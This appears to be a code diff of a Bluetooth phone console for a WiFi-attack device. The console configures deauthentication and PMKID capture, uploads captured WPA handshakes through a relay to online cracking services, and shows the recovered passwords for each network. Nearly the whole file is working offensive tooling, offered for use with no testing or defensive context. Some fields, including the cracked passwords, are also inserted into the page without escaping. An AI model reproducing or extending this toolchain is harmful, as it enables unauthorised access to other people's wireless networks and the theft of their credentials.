@@ -3,54 +3,77 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>BBoink BLE Bridge</title>
+<title>BBoink Console</title>
 <style>
   :root { color-scheme: dark; }
-  body { margin:0; font:15px/1.5 system-ui,sans-serif; background:#0d1117; color:#e6edf3; padding:16px; }
-  h1 { font-size:19px; margin:0 0 4px; }
-  .sub { color:#8b949e; font-size:13px; margin-bottom:16px; }
-  label { display:block; font-size:12px; color:#8b949e; margin:10px 0 3px; }
-  input { width:100%; box-sizing:border-box; padding:9px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#e6edf3; font-size:14px; }
-  button { width:100%; padding:12px; margin-top:12px; border:0; border-radius:9px; font-size:15px; font-weight:600; color:#fff; background:#238636; }
-  button.sec { background:#1f6feb; }
-  button:disabled { opacity:.5; }
-  #log { margin-top:14px; background:#161b22; border:1px solid #30363d; border-radius:8px; padding:10px; font:12px/1.45 ui-monospace,monospace; white-space:pre-wrap; max-height:38vh; overflow:auto; }
-  table { width:100%; border-collapse:collapse; margin-top:12px; font-size:13px; }
-  th,td { text-align:left; padding:6px 8px; border-bottom:1px solid #21262d; }
-  th { color:#8b949e; font-weight:500; }
-  .pw { font-family:ui-monospace,monospace; color:#3fb950; }
-  .pill { display:inline-block; padding:1px 7px; border-radius:10px; font-size:11px; background:#30363d; color:#8b949e; }
+  body { margin:0; font:15px/1.5 system-ui,sans-serif; background:#0d1117; color:#e6edf3; padding:14px 14px 40px; }
+  h1 { font-size:19px; margin:0 0 2px; } .sub { color:#8b949e; font-size:12px; margin-bottom:12px; }
+  label { display:block; font-size:12px; color:#8b949e; margin:9px 0 3px; }
+  input,select { width:100%; box-sizing:border-box; padding:9px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#e6edf3; font-size:14px; }
+  input[type=checkbox]{ width:auto; }
+  button { padding:11px 14px; border:0; border-radius:9px; font-size:15px; font-weight:600; color:#fff; background:#238636; cursor:pointer; }
+  button.sec{ background:#1f6feb; } button.wide{ width:100%; margin-top:10px; } button:disabled{ opacity:.5; }
+  .tabs{ display:flex; gap:6px; margin:12px 0; } .tabs button{ flex:1; background:#161b22; color:#8b949e; font-weight:500; padding:9px; }
+  .tabs button.on{ background:#1f6feb; color:#fff; }
+  .pane{ display:none; } .pane.on{ display:block; }
+  #log{ margin-top:12px; background:#161b22; border:1px solid #30363d; border-radius:8px; padding:10px; font:12px/1.45 ui-monospace,monospace; white-space:pre-wrap; max-height:40vh; overflow:auto; }
+  .cap{ background:#161b22; border:1px solid #21262d; border-radius:9px; padding:9px 11px; margin:8px 0; position:relative; }
+  .cn{ font-weight:600; } .cb{ color:#8b949e; font-size:12px; font-family:ui-monospace,monospace; }
+  .pw{ color:#3fb950; font-family:ui-monospace,monospace; margin-top:3px; }
+  .tag{ display:inline-block; background:#30363d; color:#adbac7; border-radius:9px; padding:0 7px; font-size:11px; margin:3px 4px 0 0; }
+  .tag.k{ background:#1f6feb; color:#fff; }
+  .del{ position:absolute; top:8px; right:8px; background:#b62324; padding:5px 9px; font-size:12px; }
+  .grid2{ display:grid; grid-template-columns:1fr 1fr; gap:0 10px; }
+  .row{ display:flex; align-items:center; gap:8px; margin-top:9px; }
 </style>
 </head>
 <body>
-<h1>BBoink BLE Bridge</h1>
-<div class="sub">Android + Chrome. Pulls captures off the board over Bluetooth and forwards them to your relay over this phone's connection — no board WiFi needed.</div>
+<h1>BBoink Console</h1>
+<div class="sub">Android + Chrome · everything over Bluetooth — no board WiFi/AP needed.</div>
+<button id="connect" class="sec wide">Connect to board</button>
+<div id="cstat" class="sub" style="margin-top:8px"></div>
 
-<label>Relay URL</label>
-<input id="url" placeholder="https://bboink.onrender.com">
-<label>Relay token</label>
-<input id="tok" placeholder="RELAY_TOKEN">
+<div id="app" hidden>
+  <div class="tabs">
+    <button data-t="sync" class="on">Sync</button>
+    <button data-t="caps">Captures</button>
+    <button data-t="cfg">Config</button>
+  </div>
 
-<button id="connect" class="sec">Connect to board</button>
-<button id="sync" disabled>Sync captures ↔ relay</button>
+  <div class="pane on" id="p_sync">
+    <div class="sub">Uploads captures to the relay + pulls cracked, all over cellular via this phone.</div>
+    <button id="sync" class="wide">Sync captures ↔ relay</button>
+    <div id="log"></div>
+  </div>
 
-<div id="log"></div>
-<table id="cracked" hidden><thead><tr><th>SSID</th><th>Password</th><th></th></tr></thead><tbody></tbody></table>
+  <div class="pane" id="p_caps">
+    <div class="row" style="justify-content:space-between"><b>Captures &amp; cracked</b><button class="sec" style="padding:7px 11px" onclick="loadCaps()">Refresh</button></div>
+    <div id="capsList"></div>
+  </div>
+
+  <div class="pane" id="p_cfg">
+    <div class="sub">Stored on the board. Service keys/relay are used by the relay; capture options control the hunt.</div>
+    <div id="cfgForm"></div>
+    <button id="savecfg" class="wide">Save config to board</button>
+    <div id="cfgMsg" class="sub" style="margin-top:6px"></div>
+  </div>
+</div>
 
 <script>
 const SVC='b0070000-b0b0-4b0a-9c5e-000000000000';
 const RX ='b0070001-b0b0-4b0a-9c5e-000000000000';
 const TX ='b0070002-b0b0-4b0a-9c5e-000000000000';
-
 const $=id=>document.getElementById(id);
-const logEl=$('log');
-function log(m){ logEl.textContent += m+'\n'; logEl.scrollTop=logEl.scrollHeight; }
+const logEl=()=>$('log');
+function log(m){ const e=logEl(); e.textContent+=m+'\n'; e.scrollTop=e.scrollHeight; }
 
-// restore saved relay creds
-$('url').value=localStorage.getItem('relayUrl')||'';
-$('tok').value=localStorage.getItem('relayTok')||'';
+let rxCh=null, txCh=null, waiter=null, cfg={};
 
-let rxCh=null, txCh=null, waiter=null;
+// tab switching
+document.querySelectorAll('.tabs button').forEach(b=>b.onclick=()=>{
+  document.querySelectorAll('.tabs button').forEach(x=>x.classList.toggle('on',x===b));
+  document.querySelectorAll('.pane').forEach(p=>p.classList.toggle('on',p.id==='p_'+b.dataset.t));
+});
 
 function onNotify(e){
   const v=e.target.value, type=v.getUint8(0);
@@ -59,75 +82,117 @@ function onNotify(e){
   else if(type===0x02){ waiter&&waiter.onBin&&waiter.onBin(body.slice()); }
 }
 function write(obj){ return rxCh.writeValue(new TextEncoder().encode(JSON.stringify(obj))); }
-function concat(chunks){ let n=chunks.reduce((a,c)=>a+c.length,0), out=new Uint8Array(n), o=0; for(const c of chunks){ out.set(c,o); o+=c.length; } return out; }
-
-function cmdList(){ return new Promise(res=>{ waiter={onText:j=>{ if(j.t==='list'){ waiter=null; res(j.files||[]); } }}; write({c:'list'}); }); }
-function cmdGet(name){ return new Promise((res,rej)=>{ let chunks=[]; waiter={ onText:j=>{ if(j.t==='end'){ waiter=null; res(concat(chunks)); } else if(j.t==='err'){ waiter=null; rej(j.e||'err'); } }, onBin:b=>chunks.push(b) }; write({c:'get',name}); }); }
-function cmdAck(obj){ return new Promise(res=>{ waiter={onText:j=>{ if(j.t==='ok'||j.t==='bye'){ waiter=null; res(j); } }}; write(obj); }); }
+function concat(cs){ let n=cs.reduce((a,c)=>a+c.length,0),o=new Uint8Array(n),p=0; for(const c of cs){o.set(c,p);p+=c.length;} return o; }
+// collect a begin->BIN->end stream (files, caps, crks, cfg)
+function cmdCollect(obj){ return new Promise((res,rej)=>{ let cs=[]; waiter={ onText:j=>{ if(j.t==='end'){waiter=null;res(concat(cs));} else if(j.t==='err'){waiter=null;rej(j.e||'err');} }, onBin:b=>cs.push(b) }; write(obj); }); }
+async function cmdJson(obj){ return JSON.parse(new TextDecoder().decode(await cmdCollect(obj))||'null'); }
+function cmdAck(obj){ return new Promise(res=>{ waiter={onText:j=>{ if(j.t==='ok'||j.t==='bye'){waiter=null;res(j);} }}; write(obj); }); }
+function cmdList(){ return new Promise(res=>{ waiter={onText:j=>{ if(j.t==='list'){waiter=null;res(j.files||[]);} }}; write({c:'list'}); }); }
 
 $('connect').onclick=async()=>{
   try{
-    log('requesting device…');
+    $('cstat').textContent='requesting device…';
     const dev=await navigator.bluetooth.requestDevice({filters:[{services:[SVC]}]});
-    dev.addEventListener('gattserverdisconnected',()=>{ log('⚠ board disconnected'); $('sync').disabled=true; });
-    const gatt=await dev.gatt.connect();
-    const svc=await gatt.getPrimaryService(SVC);
-    rxCh=await svc.getCharacteristic(RX);
-    txCh=await svc.getCharacteristic(TX);
-    await txCh.startNotifications();
-    txCh.addEventListener('characteristicvaluechanged',onNotify);
-    log('✔ connected to '+(dev.name||'board'));
-    $('sync').disabled=false;
-  }catch(e){ log('✖ '+e.message); }
+    dev.addEventListener('gattserverdisconnected',()=>{ $('cstat').textContent='⚠ disconnected'; $('app').hidden=true; });
+    const g=await dev.gatt.connect(), svc=await g.getPrimaryService(SVC);
+    rxCh=await svc.getCharacteristic(RX); txCh=await svc.getCharacteristic(TX);
+    await txCh.startNotifications(); txCh.addEventListener('characteristicvaluechanged',onNotify);
+    $('cstat').textContent='✔ connected to '+(dev.name||'board');
+    $('app').hidden=false;
+    await loadCfg(); await loadCaps();
+  }catch(e){ $('cstat').textContent='✖ '+e.message; }
 };
 
+// ---------- Config ----------
+const STR=[['wifi_ssid','WiFi SSID (for board direct sync)'],['wifi_pass','WiFi password'],
+ ['relay_url','Relay URL'],['relay_token','Relay token'],
+ ['wpa_key','wpa-sec key'],['ohc_key','OnlineHashCrack key'],['pwn_key','PwnCrack key'],
+ ['ntfy_topic','ntfy topic'],['ap_ssid','AP / BLE name (blank = BBoink-XXXX)']];
+const NUM=[['ch_hop_ms','Channel hop (ms)'],['atk_rssi','Min attack RSSI (dBm)'],['max_tries','Max tries'],['burst','Deauth burst'],['brightness','Brightness (10-255)']];
+const BOOL=[['deauth','Deauth'],['pmkid','PMKID hunt'],['sound','Sound']];
+
+async function loadCfg(){
+  cfg=await cmdJson({c:'getcfg'})||{};
+  let h='';
+  for(const [k,lab] of STR){
+    const val=(k==='wifi_pass')?'':(cfg[k]||'');
+    const ph=(k==='wifi_pass'&&cfg.has_wifi_pass)?'(unchanged)':'';
+    h+=`<label>${lab}</label><input id="c_${k}" value="${(''+val).replace(/"/g,'&quot;')}" placeholder="${ph}">`;
+  }
+  h+='<div class="grid2">';
+  for(const [k,lab] of NUM) h+=`<div><label>${lab}</label><input id="c_${k}" type="number" value="${cfg[k]??''}"></div>`;
+  h+='</div>';
+  for(const [k,lab] of BOOL) h+=`<div class="row"><input type="checkbox" id="c_${k}" ${cfg[k]?'checked':''}><label style="margin:0">${lab}</label></div>`;
+  $('cfgForm').innerHTML=h;
+}
+$('savecfg').onclick=async()=>{
+  $('cfgMsg').textContent='saving…';
+  try{
+    for(const [k] of STR){ const v=$('c_'+k).value; if(k==='wifi_pass'&&!v) continue; await cmdAck({c:'scfg',k,v}); }
+    for(const [k] of NUM){ await cmdAck({c:'scfg',k,v:$('c_'+k).value}); }
+    for(const [k] of BOOL){ await cmdAck({c:'scfg',k,v:$('c_'+k).checked?'1':'0'}); }
+    await cmdAck({c:'savecfg'});
+    $('cfgMsg').textContent='saved ✓'; await loadCfg();
+  }catch(e){ $('cfgMsg').textContent='save failed: '+(e.message||e); }
+};
+
+// ---------- Captures + cracked ----------
+async function loadCaps(){
+  const el=$('capsList'); el.innerHTML='<div class="cb">loading…</div>';
+  try{
+    const caps=await cmdJson({c:'caps'})||[];
+    const crks=await cmdJson({c:'crks'})||[];
+    const cm={}; for(const c of crks) cm[(c.bssid||'').toLowerCase()]=c;
+    // any cracked not in the capture registry, list too
+    const seen=new Set(caps.map(r=>(r.bssid||'').toLowerCase()));
+    let rows=caps.map(r=>{
+      const ck=cm[(r.bssid||'').toLowerCase()];
+      let t=''; if(r.captured)t+='<span class="tag">captured</span>'; if(r.manual)t+='<span class="tag">manual</span>'; if(ck)t+='<span class="tag k">CRACKED</span>';
+      const pw=ck?`<div class="pw">${ck.pass}</div>`:'';
+      return `<div class="cap"><button class="del" onclick="delCap('${r.bssid}')">delete</button><div class="cn">${esc(r.ssid)||'(hidden)'}</div><div class="cb">${r.bssid}</div>${t}${pw}</div>`;
+    });
+    for(const c of crks){ if(seen.has((c.bssid||'').toLowerCase())) continue;
+      rows.push(`<div class="cap"><div class="cn">${esc(c.ssid)||'(hidden)'}</div><div class="cb">${c.bssid}</div><span class="tag k">CRACKED</span><div class="pw">${c.pass}</div></div>`); }
+    el.innerHTML=rows.length?rows.join(''):'<div class="cb">no captures yet</div>';
+  }catch(e){ el.innerHTML='<div class="cb">failed: '+(e.message||e)+'</div>'; }
+}
+function esc(s){ return (s||'').replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c])); }
+window.delCap=async(b)=>{ if(!confirm('Delete capture (removes files, re-enables attacking it)?'))return;
+  try{ await cmdAck({c:'del',bssid:b}); await loadCaps(); }catch(e){} };
+
+// ---------- Sync (post + pull) ----------
 $('sync').onclick=async()=>{
-  const url=$('url').value.trim().replace(/\/+$/,''), tok=$('tok').value.trim();
-  if(!url||!tok){ log('✖ enter relay URL + token'); return; }
-  localStorage.setItem('relayUrl',url); localStorage.setItem('relayTok',tok);
+  const url=(cfg.relay_url||'').replace(/\/+$/,''), tok=cfg.relay_token||'';
+  if(!url||!tok){ log('✖ set Relay URL + token in the Config tab first'); return; }
   const auth={'Authorization':'Bearer '+tok};
   $('sync').disabled=true;
   try{
-    log('listing captures…');
-    const files=await cmdList();
-    log('  '+files.length+' file(s)');
+    log('listing captures…'); const files=await cmdList(); log('  '+files.length+' file(s)');
     let hashes=''; const pcaps=[];
-    for(const f of files){
-      log('  ← '+f.name+' ('+f.size+'B)');
-      const bytes=await cmdGet(f.name);
-      if(f.kind==='22000') hashes+=new TextDecoder().decode(bytes);
-      else if(f.kind==='pcap') pcaps.push({name:f.name,bytes});
-    }
+    for(const f of files){ log('  ← '+f.name+' ('+f.size+'B)'); const b=await cmdCollect({c:'get',name:f.name});
+      if(f.kind==='22000') hashes+=new TextDecoder().decode(b); else if(f.kind==='pcap') pcaps.push({name:f.name,bytes:b}); }
     if(hashes.trim()){
       log('→ posting hashes (OHC + PwnCrack)…');
       const j=await (await fetch(url+'/v1/hashes',{method:'POST',headers:{...auth,'Content-Type':'text/plain'},body:hashes})).json().catch(()=>({}));
       if(j.hashes!=null) log('  '+j.hashes+' unique hash(es)');
       if(j.ohc) log('  OHC: '+(j.ohc.error?('✖ '+j.ohc.error):(j.ohc.accepted+' accepted · '+j.ohc.skipped+' skipped(dupe) · '+j.ohc.rejected+' rejected')));
       if(j.pwncrack) log('  PwnCrack: '+(j.pwncrack.error?('✖ '+j.pwncrack.error):((j.pwncrack.ok?'✔ accepted':'HTTP '+j.pwncrack.http)+(j.pwncrack.note?(' — '+j.pwncrack.note):''))));
-    } else log('  (no hashes on board to post)');
-    for(const p of pcaps){
-      const w=(await (await fetch(url+'/v1/pcap?name='+encodeURIComponent(p.name),{method:'POST',headers:{...auth,'Content-Type':'application/octet-stream'},body:p.bytes})).json().catch(()=>({}))).wpasec||{};
-      log('  wpa-sec '+p.name+': '+(w.error?('✖ '+w.error):(w.status||('HTTP '+w.http))));
-    }
-    if(!pcaps.length) log('  (no pcaps on board for wpa-sec)');
-    log('← relay /v1/cracked …');
+    } else log('  (no hashes to post)');
+    for(const p of pcaps){ const w=(await (await fetch(url+'/v1/pcap?name='+encodeURIComponent(p.name),{method:'POST',headers:{...auth,'Content-Type':'application/octet-stream'},body:p.bytes})).json().catch(()=>({}))).wpasec||{};
+      log('  wpa-sec '+p.name+': '+(w.error?('✖ '+w.error):(w.status||('HTTP '+w.http)))); }
+    if(!pcaps.length) log('  (no pcaps for wpa-sec)');
+    log('← fetching cracked…');
     const cr=await (await fetch(url+'/v1/cracked',{headers:auth})).json();
-    log('  '+cr.count+' cracked');
-    const tb=$('cracked').querySelector('tbody'); tb.innerHTML='';
-    for(const c of (cr.cracked||[])){
-      await cmdAck({c:'crk',b:c.bssid||'',s:c.ssid||'',p:c.password||''});
-      const tr=document.createElement('tr');
-      tr.innerHTML=`<td>${c.ssid||'—'}</td><td class="pw">${c.password||''}</td><td><span class="pill">${c.source||''}</span></td>`;
-      tb.appendChild(tr);
-    }
+    log('  '+cr.count+' cracked'); let n=0;
+    for(const c of (cr.cracked||[])){ await cmdAck({c:'crk',b:c.bssid||'',s:c.ssid||'',p:c.password||''}); n++; }
     await cmdAck({c:'crkdone'});
-    if((cr.cracked||[]).length) $('cracked').hidden=false;
-    log('✔ done — cracked results written back to the board');
+    log('✔ done — '+n+' cracked written to board');
+    await loadCaps();
   }catch(e){ log('✖ '+(e.message||e)); }
   $('sync').disabled=false;
 };
 
-if(!navigator.bluetooth) log('✖ Web Bluetooth unavailable — use Chrome on Android.');
+if(!navigator.bluetooth) $('cstat').textContent='✖ Web Bluetooth unavailable — use Chrome on Android.';
 </script>
 </body>
 </html>
